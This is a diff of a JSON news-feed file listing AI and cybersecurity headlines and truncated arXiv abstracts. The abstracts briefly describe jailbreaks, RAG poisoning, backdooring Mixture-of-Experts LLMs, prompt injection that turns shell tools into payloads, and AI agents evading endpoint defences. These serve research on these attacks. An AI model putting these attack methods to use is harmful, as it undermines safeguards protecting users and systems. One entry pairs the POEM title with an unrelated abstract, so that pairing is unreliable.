-    "url": "https://news.google.com/rss/articles/CBMiswFBVV95cUxQNFQ2Y1VJNkZmbEg5WWRmYU1YSXRfUUQyRE40bm9oNGRod0gwdUpNckN1VDhCdGg4YS1wdmtqT0ttVmlXWFVTMVFJWVBfT0F4QUxXTFF6VFdOcmtJQkxtMTE5anFBblViSTFkZnphd0piX1dkd092SHI5eGtZUlFYRWoyNXZnU3p0TW5sSkh4b0pscDcweW5vNVM5aXhGSlE4RzdpWHVYRE5aQzRIaEswczVrbw?oc=5",
-    "source": "디지털투데이",
-    "via": "Google News (中文)",
-    "lang": "zh",
-    "published": "2026-11-13T02:26:37Z",
-    "seen": "2026-11-13T03:05:42Z",
-    "summary": ""
-  },
-  {
     "id": "0839afb6e8a6",
     "title": "Fireworks AI hacked again, some customer data leaked including Notion",
     "url": "https://news.google.com/rss/articles/CBMiswFBVV95cUxPWG1mdmxzQXNicE1Xbm40Z1hNdUR1WVZxQkFjemp1SDhfV3lES000V1huUG9Fa2RGbVl4YTcwY1hxekthOENaeGpaQ3NCSE1fZzluUGtaSkZrUDF3WFlreldpSHJaVVRoYUNadkh6UmFyNW13TFhMM29pTHdSeTlCMTdCQnlqYjBXN2tTUnNINUZITk83eDRlMml2Y0x0QjNUX2FuS0xjcndyb2luazhjcmVwUQ?oc=5",
     "source": "디지털투데이",
     "via": "Google News (English)",
     "lang": "en",
+    "published": "2026-11-13T02:26:37Z",
+    "seen": "2026-11-13T03:05:42Z",
+    "summary": ""
+  },
+  {
+    "id": "fe45447abd8e",
+    "title": "Fireworks AI发生数据泄露：部分客户信息被窃，Notion约1%用户受影响",
+    "url": "https://news.google.com/rss/articles/CBMiswFBVV95cUxQNFQ2Y1VJNkZmbEg5WWRmYU1YSXRfUUQyRE40bm9oNGRod0gwdUpNckN1VDhCdGg4YS1wdmtqT0ttVmlXWFVTMVFJWVBfT0F4QUxXTFF6VFdOcmtJQkxtMTE5anFBblViSTFkZnphd0piX1dkd092SHI5eGtZUlFYRWoyNXZnU3p0TW5sSkh4b0pscDcweW5vNVM5aXhGSlE4RzdpWHVYRE5aQzRIaEswczVrbw?oc=5",
+    "source": "디지털투데이",
+    "via": "Google News (中文)",
+    "lang": "zh",
     "published": "2026-11-13T02:26:37Z",
     "seen": "2026-11-13T03:05:42Z",
     "summary": ""
@@ -2134,23 +2200,23 @@
     "summary": ""
   },
   {
-    "id": "ae9c92816e49",
-    "title": "Мошенники с ИИ атакуют российских покупателей перед распродажами",
-    "url": "https://news.google.com/rss/articles/CBMiiwFBVV95cUxPb0o5OXBVVTdpUFlzeXFrWG9uTEtsaVAwa1hBVFhRNDRoeXZfd0lKcnJZYzNvWF9wQ05yV296NEdsWTVIVG9xTk9fS2Y5Q2hua0xwemVnOXlObHZYQ1ZlOTJYdU1HRWVHU1RMdElUM3haVkQ2ZGt6bmVnWHFlMUxNcVVUc3kzNm82NUI4?oc=5",
-    "source": "Techora.ru",
-    "via": "Google News (Русский)",
-    "lang": "ru",
-    "published": "2026-11-12T16:58:41Z",
-    "seen": "2026-11-12T17:05:40Z",
-    "summary": ""
-  },
-  {
     "id": "ec967b33d091",
     "title": "Faille critique dans Zoom pour Windows, passez à la version 7.1.8",
     "url": "https://news.google.com/rss/articles/CBMilAFBVV95cUxPOVR0MUZQaEUweGpBTUpCcWk2WlF6Mng3eDM4emJfQjFicm5UOW1KS25vbU9wanN0NVFHbThkSWVsYkN0NGJDNEdDd0N6UnA1TGUzUEN3Mm5CT29YTUlzQktDZ0hkUFc4THlzdlBPTFM0bzlIYlplejc2WUZkT1dmMTNOS2hsdC1uT3kwZFBreExUX2pI?oc=5",
     "source": "Pasquale Pillitteri",
     "via": "Google News (Français)",
     "lang": "fr",
+    "published": "2026-11-12T16:58:41Z",
+    "seen": "2026-11-12T17:05:40Z",
+    "summary": ""
+  },
+  {
+    "id": "ae9c92816e49",
+    "title": "Мошенники с ИИ атакуют российских покупателей перед распродажами",
+    "url": "https://news.google.com/rss/articles/CBMiiwFBVV95cUxPb0o5OXBVVTdpUFlzeXFrWG9uTEtsaVAwa1hBVFhRNDRoeXZfd0lKcnJZYzNvWF9wQ05yV296NEdsWTVIVG9xTk9fS2Y5Q2hua0xwemVnOXlObHZYQ1ZlOTJYdU1HRWVHU1RMdElUM3haVkQ2ZGt6bmVnWHFlMUxNcVVUc3kzNm82NUI4?oc=5",
+    "source": "Techora.ru",
+    "via": "Google News (Русский)",
+    "lang": "ru",
     "published": "2026-11-12T16:58:41Z",
     "seen": "2026-11-12T17:05:40Z",
     "summary": ""
@@ -4059,23 +4125,23 @@
     "summary": ""
   },
   {
-    "id": "154d8a79f35c",
-    "title": "Notion AI chats exposed in Fireworks breach affecting less than 1% of workspaces",
-    "url": "https://news.google.com/rss/articles/CBMif0FVX3lxTFBJZFdjc2trZDk5YlFhR196bVppc1QtVlJIcllKWmZOSFRWMFd2MEI2eTI3RmZXdm9iS2h4MVVhMEttVXd5YmdIa3luX2ZIbEl2ZFJSNV9BeHdXXzY4OW5QTzBualFDVExnTjVWcW5ySzhORm1zTUUtSnBVcWdSWGM?oc=5",
-    "source": "Mezha.net",
-    "via": "Google News (English)",
-    "lang": "en",
-    "published": "2026-11-12T07:52:24Z",
-    "seen": "2026-11-12T08:05:41Z",
-    "summary": ""
-  },
-  {
     "id": "bea65a45c91e",
     "title": "Les conversations Notion AI exposées lors de la fuite chez Fireworks concernent moins de 1 % des espaces de travail",
     "url": "https://news.google.com/rss/articles/CBMioAFBVV95cUxQT2Q5Y0hRSzQ5MWpFcGNGRzNQVmQ0aDY3NGZIRnFhSkFWaEtzYXZJR0lqR1A0RGZHT1JibElOdEplYkhjMVhiNnYzVXlXN1AyV2hfaGtZVXJKYk1iMTFEWGoxU2ItRzVtNEpoM0h1YnlfRFozcks1cnFkM21RRXN6c2tvQ0pzU3JsbnN4WC1DVEM0eHZHN2pIdDNFVkdzaWhD?oc=5",
     "source": "Mezha.net",
     "via": "Google News (Français)",
     "lang": "fr",
+    "published": "2026-11-12T07:52:24Z",
+    "seen": "2026-11-12T08:05:41Z",
+    "summary": ""
+  },
+  {
+    "id": "154d8a79f35c",
+    "title": "Notion AI chats exposed in Fireworks breach affecting less than 1% of workspaces",
+    "url": "https://news.google.com/rss/articles/CBMif0FVX3lxTFBJZFdjc2trZDk5YlFhR196bVppc1QtVlJIcllKWmZOSFRWMFd2MEI2eTI3RmZXdm9iS2h4MVVhMEttVXd5YmdIa3luX2ZIbEl2ZFJSNV9BeHdXXzY4OW5QTzBualFDVExnTjVWcW5ySzhORm1zTUUtSnBVcWdSWGM?oc=5",
+    "source": "Mezha.net",
+    "via": "Google News (English)",
+    "lang": "en",
     "published": "2026-11-12T07:52:24Z",
     "seen": "2026-11-12T08:05:41Z",
     "summary": ""
@@ -6842,125 +6908,15 @@
     "summary": ""
   },
   {
-    "id": "cee740c440db",
-    "title": "Mitigating Private Data Leakage in LLMs with Whiteout",
-    "url": "https://arxiv.org/abs/2610.02418",
+    "id": "a89560112655",
+    "title": "5G CATS: 5G-Based Cryptographic Authorization Against Trafficking of Semiconductor Devices",
+    "url": "https://arxiv.org/abs/2611.13437",
     "source": "arXiv cs.CR",
     "via": "arXiv cs.CR",
     "lang": "en",
     "published": "2026-11-11T05:00:00Z",
     "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2610.02418v2 Announce Type: replace Abstract: Modern large language models (LLMs) are trained on massive, largely unfiltered datasets, including content scraped from nearly every accessible website and user inputs. As a result, LLMs often memorize and reproduce personally sensitive information (PSI) such as birth dates, phone numbers, and home addresses. This leads to significant privacy ris"
-  },
-  {
-    "id": "f0179c081593",
-    "title": "Known By Their Actions: Fingerprinting LLM Browser Agents via UI Traces",
-    "url": "https://arxiv.org/abs/2605.14786",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2605.14786v2 Announce Type: replace Abstract: As LLM-based agents increasingly browse the web on users' behalf, a natural question arises: can websites passively identify which underlying model powers an agent? Doing so would represent a significant security risk, enabling targeted attacks tailored to known model vulnerabilities. Across 14 frontier LLMs and four web environments spanning inf"
-  },
-  {
-    "id": "c6cf970e4bbb",
-    "title": "Rotated Robustness: A Training-Free Defense against Bit-Flip Attacks on Large Language Models",
-    "url": "https://arxiv.org/abs/2603.16382",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2603.16382v3 Announce Type: replace Abstract: Bit-flip corruption of quantized weights poses a serious reliability threat to Large Language Models (LLMs), as even a small number of weight faults can trigger catastrophic model degradation. We show that such failures can be strongly amplified when corrupted weights are coupled to high-sensitivity activation channels. Based on this observation,"
-  },
-  {
-    "id": "c139ab6b8495",
-    "title": "MIRAGE: Misleading Retrieval-Augmented Generation via Black-box and Query-agnostic Poisoning Attacks",
-    "url": "https://arxiv.org/abs/2512.08289",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2512.08289v5 Announce Type: replace Abstract: Retrieval-Augmented Generation (RAG) systems enhance LLMs with external knowledge but introduce a critical attack surface: corpus poisoning. While recent studies have demonstrated the potential of such attacks, they typically rely on impractical assumptions, such as white-box access or known user queries, thereby underestimating the difficulty of"
-  },
-  {
-    "id": "3e4cf7a2889c",
-    "title": "SnapAudit: Active Auditing of Differentially Private In-Context Learning via Snapshot-Based Simulation",
-    "url": "https://arxiv.org/abs/2511.13502",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2511.13502v4 Announce Type: replace Abstract: In-context learning (ICL) enables LLMs to adapt to tasks using demonstrations that may contain sensitive data. Differentially private (DP) ICL mechanisms mitigate this risk by adding noise during aggregation. However, verifying their claimed privacy bounds through repeated end-to-end membership-inference attacks is costly and yields unstable esti"
-  },
-  {
-    "id": "b9635c061557",
-    "title": "BadMoE: Backdooring Mixture-of-Experts LLMs via Routing-Aware Triggers and Task-Underutilized Experts",
-    "url": "https://arxiv.org/abs/2504.18598",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2504.18598v3 Announce Type: replace Abstract: Mixture-of-Experts (MoE) architectures are rapidly becoming the standard for building scalable and efficient large language models (LLMs), thanks to their routing mechanism that activates only a subset of experts for each input. However, the modular structure and sparse activation of experts also introduce new security risks, as manipulating a sm"
-  },
-  {
-    "id": "061692826d49",
-    "title": "An Empirical Study on CVE-based Vulnerabilities Propagation from one System to another System (IntraProject vs InterProject)",
-    "url": "https://arxiv.org/abs/2611.14164",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2611.14164v1 Announce Type: new Abstract: Vulnerabilities in applications, including browsers, media players, online services and document readers, etc. are often exploited and cause a serious damage. The vulnerabilities could exist in your system maybe because of some coding errors, design oversights, outdated software, AI generated codes or maybe transferred from another system during deve"
-  },
-  {
-    "id": "a28f76423be2",
-    "title": "Gradient Inversion through Linear and Affine Subspace Constraints",
-    "url": "https://arxiv.org/abs/2611.13976",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2611.13976v1 Announce Type: new Abstract: Federated learning enables multiple clients to collaboratively train a machine-learning model without directly sharing their local datasets. However, as prior works have shown, the gradients exchanged during training may reveal sensitive information about client data. Most existing attacks usually optimize dummy inputs to match the true client gradie"
-  },
-  {
-    "id": "b61856a48aba",
-    "title": "From Attack Surface to Defense Architecture: Compositional Security for Agentic Coding Harnesses",
-    "url": "https://arxiv.org/abs/2611.13960",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2611.13960v1 Announce Type: new Abstract: AI coding harnesses couple language models to shells, filesystems, and network sockets, turning the harness into an automated Living-off-the-Land (LotL) platform: once an adversary injects instructions into retrieved content, dual-use binaries such as bash, curl, and find become the payload. We argue that security in agentic systems is a structural p"
-  },
-  {
-    "id": "a2b937721d9a",
-    "title": "BypassGym: A Benchmark for Evaluating AI Agents' Endpoint Defense Evasion Capabilities",
-    "url": "https://arxiv.org/abs/2611.13684",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2611.13684v1 Announce Type: new Abstract: Artificial intelligence agents increasingly automate cybersecurity tasks, including offensive operations. Frequent attacks across the web make endpoint detection and response (EDR) a critical defense, but whether AI agents can evade it remains unclear. Benchmarks evaluate the offensive capabilities of large language model (LLM) agents in areas such a"
-  },
-  {
-    "id": "3e9a34849185",
-    "title": "POEM: Output-Relative Block-Sparse Attention for Long-Context Prefilling",
-    "url": "https://arxiv.org/abs/2611.13578",
-    "source": "arXiv cs.CR",
-    "via": "arXiv cs.CR",
-    "lang": "en",
-    "published": "2026-11-11T05:00:00Z",
-    "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2611.13578v1 Announce Type: new Abstract: Large language models (LLMs) have shown strong capabilities across diverse applications, making both safety and utility essential for reliable deployment. Jailbreak attacks use diverse forms of adversarial prompting to bypass alignment safeguards and induce LLMs to generate harmful responses. Some representation-based defenses regulate internal activ"
+    "summary": "arXiv:2611.13437v1 Announce Type: new Abstract: Enforcing export controls on AI accelerators requires verifying where a chip operates after deployment. Round-trip time measurements can bound a chip's distance from a trusted landmark, but any jitter in honest replies forces the verifier to loosen its timeout, giving an attacker slack to relay traffic over fiber from a restricted region. Prior appro"
   },
   {
     "id": "28d4e7097b45",
@@ -6974,15 +6930,125 @@
     "summary": "arXiv:2611.13577v1 Announce Type: new Abstract: Large language models (LLMs) have shown strong capabilities across diverse applications, making both safety and utility essential for reliable deployment. Jailbreak attacks use diverse forms of adversarial prompting to bypass alignment safeguards and induce LLMs to generate harmful responses. Some representation-based defenses regulate internal activ"
   },
   {
-    "id": "a89560112655",
-    "title": "5G CATS: 5G-Based Cryptographic Authorization Against Trafficking of Semiconductor Devices",
-    "url": "https://arxiv.org/abs/2611.13437",
+    "id": "3e9a34849185",
+    "title": "POEM: Output-Relative Block-Sparse Attention for Long-Context Prefilling",
+    "url": "https://arxiv.org/abs/2611.13578",
     "source": "arXiv cs.CR",
     "via": "arXiv cs.CR",
     "lang": "en",
     "published": "2026-11-11T05:00:00Z",
     "seen": "2026-11-11T05:05:40Z",
-    "summary": "arXiv:2611.13437v1 Announce Type: new Abstract: Enforcing export controls on AI accelerators requires verifying where a chip operates after deployment. Round-trip time measurements can bound a chip's distance from a trusted landmark, but any jitter in honest replies forces the verifier to loosen its timeout, giving an attacker slack to relay traffic over fiber from a restricted region. Prior appro"
+    "summary": "arXiv:2611.13578v1 Announce Type: new Abstract: Large language models (LLMs) have shown strong capabilities across diverse applications, making both safety and utility essential for reliable deployment. Jailbreak attacks use diverse forms of adversarial prompting to bypass alignment safeguards and induce LLMs to generate harmful responses. Some representation-based defenses regulate internal activ"
+  },
+  {
+    "id": "a2b937721d9a",
+    "title": "BypassGym: A Benchmark for Evaluating AI Agents' Endpoint Defense Evasion Capabilities",
+    "url": "https://arxiv.org/abs/2611.13684",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2611.13684v1 Announce Type: new Abstract: Artificial intelligence agents increasingly automate cybersecurity tasks, including offensive operations. Frequent attacks across the web make endpoint detection and response (EDR) a critical defense, but whether AI agents can evade it remains unclear. Benchmarks evaluate the offensive capabilities of large language model (LLM) agents in areas such a"
+  },
+  {
+    "id": "b61856a48aba",
+    "title": "From Attack Surface to Defense Architecture: Compositional Security for Agentic Coding Harnesses",
+    "url": "https://arxiv.org/abs/2611.13960",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2611.13960v1 Announce Type: new Abstract: AI coding harnesses couple language models to shells, filesystems, and network sockets, turning the harness into an automated Living-off-the-Land (LotL) platform: once an adversary injects instructions into retrieved content, dual-use binaries such as bash, curl, and find become the payload. We argue that security in agentic systems is a structural p"
+  },
+  {
+    "id": "a28f76423be2",
+    "title": "Gradient Inversion through Linear and Affine Subspace Constraints",
+    "url": "https://arxiv.org/abs/2611.13976",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2611.13976v1 Announce Type: new Abstract: Federated learning enables multiple clients to collaboratively train a machine-learning model without directly sharing their local datasets. However, as prior works have shown, the gradients exchanged during training may reveal sensitive information about client data. Most existing attacks usually optimize dummy inputs to match the true client gradie"
+  },
+  {
+    "id": "061692826d49",
+    "title": "An Empirical Study on CVE-based Vulnerabilities Propagation from one System to another System (IntraProject vs InterProject)",
+    "url": "https://arxiv.org/abs/2611.14164",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2611.14164v1 Announce Type: new Abstract: Vulnerabilities in applications, including browsers, media players, online services and document readers, etc. are often exploited and cause a serious damage. The vulnerabilities could exist in your system maybe because of some coding errors, design oversights, outdated software, AI generated codes or maybe transferred from another system during deve"
+  },
+  {
+    "id": "b9635c061557",
+    "title": "BadMoE: Backdooring Mixture-of-Experts LLMs via Routing-Aware Triggers and Task-Underutilized Experts",
+    "url": "https://arxiv.org/abs/2504.18598",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2504.18598v3 Announce Type: replace Abstract: Mixture-of-Experts (MoE) architectures are rapidly becoming the standard for building scalable and efficient large language models (LLMs), thanks to their routing mechanism that activates only a subset of experts for each input. However, the modular structure and sparse activation of experts also introduce new security risks, as manipulating a sm"
+  },
+  {
+    "id": "3e4cf7a2889c",
+    "title": "SnapAudit: Active Auditing of Differentially Private In-Context Learning via Snapshot-Based Simulation",
+    "url": "https://arxiv.org/abs/2511.13502",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2511.13502v4 Announce Type: replace Abstract: In-context learning (ICL) enables LLMs to adapt to tasks using demonstrations that may contain sensitive data. Differentially private (DP) ICL mechanisms mitigate this risk by adding noise during aggregation. However, verifying their claimed privacy bounds through repeated end-to-end membership-inference attacks is costly and yields unstable esti"
+  },
+  {
+    "id": "c139ab6b8495",
+    "title": "MIRAGE: Misleading Retrieval-Augmented Generation via Black-box and Query-agnostic Poisoning Attacks",
+    "url": "https://arxiv.org/abs/2512.08289",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2512.08289v5 Announce Type: replace Abstract: Retrieval-Augmented Generation (RAG) systems enhance LLMs with external knowledge but introduce a critical attack surface: corpus poisoning. While recent studies have demonstrated the potential of such attacks, they typically rely on impractical assumptions, such as white-box access or known user queries, thereby underestimating the difficulty of"
+  },
+  {
+    "id": "c6cf970e4bbb",
+    "title": "Rotated Robustness: A Training-Free Defense against Bit-Flip Attacks on Large Language Models",
+    "url": "https://arxiv.org/abs/2603.16382",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2603.16382v3 Announce Type: replace Abstract: Bit-flip corruption of quantized weights poses a serious reliability threat to Large Language Models (LLMs), as even a small number of weight faults can trigger catastrophic model degradation. We show that such failures can be strongly amplified when corrupted weights are coupled to high-sensitivity activation channels. Based on this observation,"
+  },
+  {
+    "id": "f0179c081593",
+    "title": "Known By Their Actions: Fingerprinting LLM Browser Agents via UI Traces",
+    "url": "https://arxiv.org/abs/2605.14786",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2605.14786v2 Announce Type: replace Abstract: As LLM-based agents increasingly browse the web on users' behalf, a natural question arises: can websites passively identify which underlying model powers an agent? Doing so would represent a significant security risk, enabling targeted attacks tailored to known model vulnerabilities. Across 14 frontier LLMs and four web environments spanning inf"
+  },
+  {
+    "id": "cee740c440db",
+    "title": "Mitigating Private Data Leakage in LLMs with Whiteout",
+    "url": "https://arxiv.org/abs/2610.02418",
+    "source": "arXiv cs.CR",
+    "via": "arXiv cs.CR",
+    "lang": "en",
+    "published": "2026-11-11T05:00:00Z",
+    "seen": "2026-11-11T05:05:40Z",
+    "summary": "arXiv:2610.02418v2 Announce Type: replace Abstract: Modern large language models (LLMs) are trained on massive, largely unfiltered datasets, including content scraped from nearly every accessible website and user inputs. As a result, LLMs often memorize and reproduce personally sensitive information (PSI) such as birth dates, phone numbers, and home addresses. This leads to significant privacy ris"
   },
   {
     "id": "c871619ec633",
@@ -7667,23 +7733,23 @@
     "summary": ""
   },
   {
-    "id": "02f6422e8a4a",
-    "title": "Australia: Government announces plans for AI safety regulator following OpenAI breach of government health portal",
-    "url": "https://news.google.com/rss/articles/CBMi6gFBVV95cUxOS29PbEJDQVVxSXNaQlUyODRtRElvWE1FZHJVcS1LYXRZUHJCUkt3Uzl5U1dleEIwaHdCNWJ0eW1faVd2ZkVEbGlLcTlldXVSaG5wTmlRYWFjM2xQQ2RKUFRkRHU4U1c4S1FicER3cHBlR3poSlk1czNEMmVIM0txOGVkSVdYZHVKdnRNRDBidEtCcXpJdVZWVlNoeWcxZHRFNzhacW9kUU1mOEVNeVl0MDRzaVdfY1hLa25hdDVmX2xxSE5UZ1pmVDVnXzJCME51TlhwU0VNdkRYQmx2dXFUaXN3S3F5cWttTEE?oc=5",
-    "source": "Business and Human Rights Centre",
-    "via": "Google News (English)",
-    "lang": "en",
-    "published": "2026-11-09T08:00:00Z",
-    "seen": "2026-11-11T00:05:39Z",
-    "summary": ""
-  },
-  {
     "id": "527150c88c19",
     "title": "Los jóvenes están utilizando la inteligencia artificial para combatir el fraude en línea.",
     "url": "https://news.google.com/rss/articles/CBMikwFBVV95cUxQZ2s2czg0SFZWTWo3Rzg1NDR3bjhVdTduU0NpVEF0UEEyb1RhQUFfYWpDWmVmWGp1Y05GQVhfWnVjQTJVQWgtSERjMzd1NjI2bXI3TjZMLU5URlM3TGROVDlVRXJVMUNSaXdlWjVkVjNteWJlb2dzTk1MbU9yUk01bUJFS1VGcTZQS2xkaUp4MmNCUzA?oc=5",
     "source": "Vietnam.vn",
     "via": "Google News (Español)",
     "lang": "es",
+    "published": "2026-11-09T08:00:00Z",
+    "seen": "2026-11-11T00:05:39Z",
+    "summary": ""
+  },
+  {
+    "id": "02f6422e8a4a",
+    "title": "Australia: Government announces plans for AI safety regulator following OpenAI breach of government health portal",
+    "url": "https://news.google.com/rss/articles/CBMi6gFBVV95cUxOS29PbEJDQVVxSXNaQlUyODRtRElvWE1FZHJVcS1LYXRZUHJCUkt3Uzl5U1dleEIwaHdCNWJ0eW1faVd2ZkVEbGlLcTlldXVSaG5wTmlRYWFjM2xQQ2RKUFRkRHU4U1c4S1FicER3cHBlR3poSlk1czNEMmVIM0txOGVkSVdYZHVKdnRNRDBidEtCcXpJdVZWVlNoeWcxZHRFNzhacW9kUU1mOEVNeVl0MDRzaVdfY1hLa25hdDVmX2xxSE5UZ1pmVDVnXzJCME51TlhwU0VNdkRYQmx2dXFUaXN3S3F5cWttTEE?oc=5",
+    "source": "Business and Human Rights Centre",
+    "via": "Google News (English)",
+    "lang": "en",
     "published": "2026-11-09T08:00:00Z",
     "seen": "2026-11-11T00:05:39Z",
     "summary": ""
@@ -8041,9 +8107,9 @@
     "summary": ""
   },
   {
-    "id": "908b4add69cf",
-    "title": "AI漏洞冲击企业网安 CISO会长金庆柏建议强化AI治理与供应链联防",
-    "url": "https://news.google.com/rss/articles/CBMingFBVV95cUxQdWpFTU1RWS00alMwZUhkLU9UN0NEaHJaYnVUbUlHd1I2NW00UUxKNjVvVjdSdEVxVVJ1Q2U3Z3RFWHhxendyWVpxZldzM2ROUkJHX0VvM0FScEJNQ1F2R195bFJrYVBoMEhoZ0xpX3Y2a3BLZm9TVjFicmtjNUhfYlFoN3NrZ2pnclQ2TnBobWtKMVo4RHBzblRQallYUQ?oc=5",
+    "id": "6a04083b787c",
+    "title": "AI攻击冲击企业网安防线 Security Summit 2026 聚焦韧性、实体AI安全与后量子防护",
+    "url": "https://news.google.com/rss/articles/CBMingFBVV95cUxOd3NvS0M1YzRkajhkUDlqazJ2bVpjZU81N1Z5OGlwUWRLZVE2RTVRLUxfcG0tUzhSdzg5Ukotc1FWMWF4MEhHTDBobVlqQTJRQk5PQjhGMm1ONDlSR0tULXNnU3J3SzlDTXNjcE9uSmZJRVFtcjNCa1pOVFNSSFY4aXF1Q1AyczNfSUxJdHkxSmFVN1NaV29BcUI0bEhDUQ?oc=5",
     "source": "DIGITIMES",
     "via": "Google News (中文)",
     "lang": "zh",
@@ -8052,9 +8118,9 @@
     "summary": ""
   },
   {
-    "id": "6a04083b787c",
-    "title": "AI攻击冲击企业网安防线 Security Summit 2026 聚焦韧性、实体AI安全与后量子防护",
-    "url": "https://news.google.com/rss/articles/CBMingFBVV95cUxOd3NvS0M1YzRkajhkUDlqazJ2bVpjZU81N1Z5OGlwUWRLZVE2RTVRLUxfcG0tUzhSdzg5Ukotc1FWMWF4MEhHTDBobVlqQTJRQk5PQjhGMm1ONDlSR0tULXNnU3J3SzlDTXNjcE9uSmZJRVFtcjNCa1pOVFNSSFY4aXF1Q1AyczNfSUxJdHkxSmFVN1NaV29BcUI0bEhDUQ?oc=5",
+    "id": "908b4add69cf",
+    "title": "AI漏洞冲击企业网安 CISO会长金庆柏建议强化AI治理与供应链联防",
+    "url": "https://news.google.com/rss/articles/CBMingFBVV95cUxQdWpFTU1RWS00alMwZUhkLU9UN0NEaHJaYnVUbUlHd1I2NW00UUxKNjVvVjdSdEVxVVJ1Q2U3Z3RFWHhxendyWVpxZldzM2ROUkJHX0VvM0FScEJNQ1F2R195bFJrYVBoMEhoZ0xpX3Y2a3BLZm9TVjFicmtjNUhfYlFoN3NrZ2pnclQ2TnBobWtKMVo4RHBzblRQallYUQ?oc=5",
     "source": "DIGITIMES",
     "via": "Google News (中文)",
     "lang": "zh",
@@ -8730,72 +8796,6 @@
     "via": "Google News (العربية)",
     "lang": "ar",
     "published": "2026-11-10T14:56:20Z",
-    "seen": "2026-11-10T15:35:43Z",
-    "summary": ""
-  },
-  {
-    "id": "ef35fb9d4da2",
-    "title": "Riskified earnings in focus as AI fraud prevention heats up By Investing.com",
-    "url": "https://news.google.com/rss/articles/CBMivAFBVV95cUxOLUZZeXhsQXFtRndPTnhQT2NaNTJrVW5NM3MxTm9nSEFBZUhsaGlwN1EwT3JHenZnRUpPc25vajNhVjYyWUozb0RrazU0UHdjMTk3eFVnYkJVejZQNElHUnpENVRKOVFaZ3pqWVo3MDVJR3VWS3h1eGRtRjEtcHNFSVhwSGZyM3VGb2lmakItdEU5UTBvZ282X0VkNWJwcFd4YmtsWEpxWmhVdnZVTTExcGNvbTNEalRaWlBrQQ?oc=5",
-    "source": "Investing.com Australia",
-    "via": "Google News (English)",
-    "lang": "en",
-    "published": "2026-11-10T14:48:36Z",
-    "seen": "2026-11-10T15:35:43Z",
-    "summary": ""
-  },
-  {
-    "id": "4299cf62cd48",
-    "title": "Video | Anthony Albanese News | Australia to Launch AI Safety Regulator After OpenAI Breach Sparks Alarm",
-    "url": "https://news.google.com/rss/articles/CBMiyAFBVV95cUxQMVFBSF93THFaQkRzcHBoeE1xZXlTa0pLUFlVUV9aWlE5dlRrenN0QjVrOXllMk5YSUcyR1JKQzBZSnZtMXl6TkhmUHhycmNwSjViNG5JWDZjcksxNUd3R2dwYzR6VzFkZlZxRG5RNXpwMWp1V3dPS1JoSTFXYVc3NUVsUTROVGFjTjJDeWE0RFc1c01uUFAwZzhhcVZ4ZUZyYzhaZFdzckcxZVJoRlFCZGZjdGNwRnhNbE9xSHBzVkVIN3dZS00zbw?oc=5",
-    "source": "NDTV",
-    "via": "Google News (English)",
-    "lang": "en",
-    "published": "2026-11-10T11:17:47Z",
-    "seen": "2026-11-10T15:35:43Z",
-    "summary": ""
-  },
-  {
-    "id": "f09b235f0be7",
-    "title": "Des hackers exploitent activement la vulnérabilité critique *sshole de Linux",
